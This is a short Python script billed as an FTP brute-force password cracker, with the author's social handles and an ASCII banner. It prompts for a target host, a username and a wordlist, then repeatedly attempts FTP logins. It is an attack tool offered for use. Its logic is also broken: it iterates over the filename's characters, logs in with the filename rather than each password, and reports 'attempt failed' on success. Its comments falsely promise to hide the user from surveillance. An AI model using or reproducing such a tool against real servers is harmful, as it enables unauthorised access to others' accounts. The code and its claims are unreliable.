import ftplib



#ftp cracker by wigans victor
#twitter account: @victorwigansH
#email:wigansvictor@gmail.com

#opensource code

print("---------------------------------------------")
print("--- VICTOR WIGANS BRUTE FORCE FTP CRACKER ---")
print("---------------------------------------------")

print("\n")
print("Follo me on Twitter: @victorwigansH")
print("\n")
print("Note you can improve the crack.py and gbrute.txt")
print("\n")

print("000                 00000000000")
print(" 000     000       000")
print(" 000   00  000   00000000")
print("   00 000    000 00")
print("    0000      0000")

print("\n")
print("**************MENU**************")
print("\n")
server=input("Enter ip/hostname: ")
print(server)  	
usr=input("Enter ftp username: ")
print(usr)  	
passwd=input("Enter ftp file for brute fore which gbrute.txt: ")
print(passwd)  	
	#leveling..
	#hiding you from surevillance..
	#keeping you low...
try:
    f = open(passwd, "r")
except:
    print("checking...done, i found it")
try:
    for pw in passwd:
        pw = pw.strip("\r")
        try:
            ftp = ftplib.FTP(server)
            ftp.login(usr, passwd)
            print("hacked" + pw)
            ftp.quit
        
        except:
            print("hacking...")
        else:
            print("attempt failed")

except:
    print("Error no network")
    
